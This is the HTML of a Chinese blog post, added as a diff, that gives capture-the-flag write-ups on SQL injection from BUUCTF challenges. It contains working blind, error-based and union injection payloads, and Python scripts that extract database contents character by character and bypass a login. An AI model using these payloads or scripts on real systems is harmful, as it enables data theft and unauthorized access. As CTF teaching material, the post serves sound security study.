@@ -1,0 +1,816 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
+  <link rel="icon" type="image/png" href="/img/feiji.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sunzy">
+  <meta name="keywords" content="">
+  <title>buuctf-sql注入 - 一路走到黑</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-05 18:29" pubdate>
+        2020年10月5日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      25
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">buuctf-sql注入</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="buuctf–注入篇"><a href="#buuctf–注入篇" class="headerlink" title="buuctf–注入篇"></a>buuctf–注入篇</h1><span id="more"></span>
+
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>给了提示，<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p>
+<p>猜测flag在flag 表中，查询语句应该是 select flag from flag</p>
+<p>经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注</p>
+<p><img src="https://i.loli.net/2020/11/30/gJAqhVCpN8nYvs1.png" srcset="/img/loading.gif" alt></p>
+<p>构造盲注语句</p>
+<p><code>id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2)</code></p>
+<p><img src="https://i.loli.net/2020/11/30/YGtuAcFr2sHZUdD.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/oUqeZdHLfJCQPgr.png" srcset="/img/loading.gif" alt></p>
+<p>两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。</p>
+<div class="hljs"><pre><code class="hljs python">// 二分注入
+<span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php&quot;</span>
+
+data = &#123;<span class="hljs-built_in">id</span> : <span class="hljs-string">&quot;&quot;</span>&#125;
+
+flag = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
+    left = <span class="hljs-number">33</span>
+    right = <span class="hljs-number">128</span>
+    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span>(right&gt;left):
+
+        data[<span class="hljs-string">&quot;id&quot;</span>] = <span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
+        response = requests.post(url,data=data)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> response.text:
+            left = mid+<span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            right = mid
+        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
+    flag = flag + <span class="hljs-built_in">chr</span>(mid)
+    print(flag)
+
+print(flag)</code></pre></div>
+
+
+
+
+
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><strong>报错注入</strong></p>
+<p>测试发现<code>or,union,substr,空格,/**/</code>等都被加入黑名单，双写也无法绕过</p>
+<p><img src="https://i.loli.net/2020/11/30/uHTdrgxB7I8QLDK.png" srcset="/img/loading.gif" alt></p>
+<p>可是使用报错注入</p>
+<blockquote>
+<p>报错注入原理：</p>
+<p>其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
+</blockquote>
+<p>相关链接</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/richardlee97/p/10617115.html">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d8ae3e8dabdc">https://www.jianshu.com/p/d8ae3e8dabdc</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37873738/article/details/88042610">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p>
+<blockquote>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) 。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p>
+</blockquote>
+<p>查询语句如下</p>
+<div class="hljs"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>
+
+?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;H4rDsq1&#x27;</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>
+
+?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div>
+
+<p>这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来</p>
+<p>显示后面的flag</p>
+<div class="hljs"><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(right(<span class="hljs-keyword">password</span>,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(geek.H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre></div>
+
+
+
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>sql注入+反序列化+代码审计</p>
+<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>下载的源码，有助于后面做题</p>
+<div class="hljs"><pre><code class="hljs php">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);
+<span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];
+<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];
+<span class="hljs-variable">$t_pw</span> = md5(<span class="hljs-variable">$password</span>);     <span class="hljs-comment">//对传入的password参数进行了md5加密</span>
+<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;
+<span class="hljs-comment">// echo $sql;</span>
+<span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);
+
+<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;  <span class="hljs-comment">//  过滤了() | = or </span>
+	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack me!&quot;</span>);
+&#125;
+<span class="hljs-keyword">else</span>&#123;
+	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;
+		printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));
+		<span class="hljs-keyword">exit</span>();
+	&#125;
+	<span class="hljs-keyword">else</span>&#123;
+		<span class="hljs-comment">// echo &#x27;&lt;pre&gt;&#x27;;</span>
+		<span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);
+		<span class="hljs-comment">// print_r($arr);</span>
+		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;
+			<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;    <span class="hljs-comment">//</span>
+				<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
+			&#125;
+			<span class="hljs-keyword">else</span>&#123;
+				<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong pass!&quot;</span>);
+			&#125;
+		&#125;
+		<span class="hljs-keyword">else</span>&#123;
+			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong user!&quot;</span>);
+		&#125;
+	&#125;
+&#125;</code></pre></div>
+
+<p>随便输入用户名和密码，查看源码，出现提示</p>
+<p><img src="https://i.loli.net/2020/11/30/yMceIJS4DYLHsh6.png" srcset="/img/loading.gif" alt></p>
+<p>试了试应该是base32，解码后是base64</p>
+<div class="hljs"><pre><code class="hljs gcode">c<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>ICogZ<span class="hljs-symbol">nJvbSB1</span>c<span class="hljs-number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gJyRuYW<span class="hljs-number">1</span>lJw==</code></pre></div>
+
+<p>继续解码</p>
+<div class="hljs"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span></code></pre></div>
+
+<p>注入点是name参数这里，与上面源码中的查询语句一样。</p>
+<p>经过测试发现有三列，<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>显示正常，<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>报错</p>
+<p>但是页面没有数字回显，所以常规的注入应该是不行的。</p>
+<p>值得注意的是，这题可以知道username是admin，</p>
+<p>输入username=admin&amp;password=11,时提示wrong pass!</p>
+<p>输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin</p>
+<p>接下来介绍一种新的union注入</p>
+<p>先建立一张表</p>
+<p><img src="https://i.loli.net/2020/11/30/9bS4DTXuCfmxykg.png" srcset="/img/loading.gif" alt></p>
+<div class="hljs"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;2322&#x27;</span>;</code></pre></div>
+
+<p>union语句后查询的是表中不存在的一个数据，查询结果如下</p>
+<p><img src="https://i.loli.net/2020/11/30/n6EeYVXdCxH72oO.png" srcset="/img/loading.gif" alt></p>
+<p><strong>这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表</strong>，其中放着所查询到的数据和union后包含的数据</p>
+<p>这里就是 id=1,username=admin,password=2322</p>
+<p>这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录</p>
+<p>接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了</p>
+<p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong user!</p>
+<p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong pass!</p>
+<p>第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容<strong>（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知）</strong></p>
+<p>payload:</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">name</span>=<span class="hljs-number">000</span>&#x27;union select <span class="hljs-number">1</span>,&#x27;admin&#x27;,&#x27;b<span class="hljs-number">59</span>c<span class="hljs-number">67</span>bf<span class="hljs-number">196</span>a<span class="hljs-number">4758191</span>e<span class="hljs-number">42</span>f<span class="hljs-number">76670</span>ceba&#x27;#&amp;pw=<span class="hljs-number">1111</span></code></pre></div>
+
+<p><code>b59c67bf196a4758191e42f76670ceba</code>是1111的md5值，pw的值为1111</p>
+<p><img src="https://i.loli.net/2020/11/30/Xhp1PgH7QlejDYn.png" srcset="/img/loading.gif" alt></p>
+<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>与hard sql是一个系列的，但是这个应该是盲注</p>
+<p>在search.php中找到注入点，测试可以发现是数字型注入</p>
+<p> fuzz之后可以发现对于不同的字符，回显不同，并且过滤了空格，但是<code>^</code>没有被过滤，所以可以利用这个符号</p>
+<p>可以看到当id = 1 时，页面回显为，可以将这个为判断的标志</p>
+<p><img src="https://i.loli.net/2020/12/23/DO6SQjuJLqm9ycM.png" srcset="/img/loading.gif" alt="image-20201223090038080"></p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>^<span class="hljs-number">1</span>^<span class="hljs-number">1</span> = <span class="hljs-number">1</span>
+<span class="hljs-attribute">1</span>^<span class="hljs-number">0</span>^<span class="hljs-number">1</span> = <span class="hljs-number">0</span></code></pre></div>
+
+<p>所以可以将注入的payload加到中间，例如</p>
+<div class="hljs"><pre><code class="hljs perl"><span class="hljs-number">1</span>^(<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(group_concat(schema_name))from(information_schema.schema
+ta)),%d,<span class="hljs-number">1</span>))=%d)^<span class="hljs-number">1</span><span class="hljs-string">&quot;%(i,ord(j))</span></code></pre></div>
+
+<p>注入脚本如下，使用的是二分法</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+
+url = <span class="hljs-string">&quot;http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php&quot;</span>
+flag = <span class="hljs-string">&#x27;&#x27;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span>(<span class="hljs-params">i, j</span>):</span>
+    time.sleep(<span class="hljs-number">1</span>)
+    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span>
+    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span>
+    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span>
+    sql = <span class="hljs-string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)
+    data = &#123;<span class="hljs-string">&quot;id&quot;</span>: sql&#125;
+    r = requests.get(url, params=data)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Click&quot;</span> <span class="hljs-keyword">in</span> r.text:
+        res = <span class="hljs-number">1</span>
+    <span class="hljs-keyword">else</span>:
+        res = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">return</span> res
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>
+    <span class="hljs-keyword">global</span> flag
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>):
+        print(i, <span class="hljs-string">&#x27;:&#x27;</span>)
+        low = <span class="hljs-number">31</span>
+        high = <span class="hljs-number">127</span>
+        <span class="hljs-keyword">while</span> low &lt;= high:
+            mid = (low + high) // <span class="hljs-number">2</span>
+            res = payload(i, mid)
+            <span class="hljs-keyword">if</span> res:
+                low = mid + <span class="hljs-number">1</span>
+            <span class="hljs-keyword">else</span>:
+                high = mid - <span class="hljs-number">1</span>
+        f = <span class="hljs-built_in">int</span>((low + high + <span class="hljs-number">1</span>)) // <span class="hljs-number">2</span>
+        <span class="hljs-keyword">if</span> (f == <span class="hljs-number">127</span> <span class="hljs-keyword">or</span> f == <span class="hljs-number">31</span>):
+            <span class="hljs-keyword">break</span>
+        <span class="hljs-comment"># print (f)</span>
+        flag += <span class="hljs-built_in">chr</span>(f)
+        print(flag)
+exp()
+print(<span class="hljs-string">&#x27;flag=&#x27;</span>, flag)</code></pre></div>
+
+<p>又学到了新的注入姿势，真不错</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12305052.html">https://www.cnblogs.com/wangtanzhi/p/12305052.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/buuoj/">buuoj</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BA%8C%E5%88%86%E6%B3%A8%E5%85%A5/">二分注入</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a>
+                    
+                      <a class="hover-with-bg" href="/tags/union%E6%96%B0%E5%A7%BF%E5%8A%BF/">union新姿势</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/08/buuoj-z7z8/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">buuctf-z7z8</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/09/27/homework/">
+                        <span class="hidden-mobile">网安作业1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
+          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
+          placeholder: "说点什么吧~~~",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: true,
+          recordIP: false,
+          serverURLs: "",
+          master: "4cd096660a71d786a2a4d9d0bb4e8996",
+          friends: "b275f0fc8103331da645a878cf60f841",
+          tagMeta: ["博主","友人","访客"],
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container custom post-content mx-auto">
+      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
+    </div>
+  </div>
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
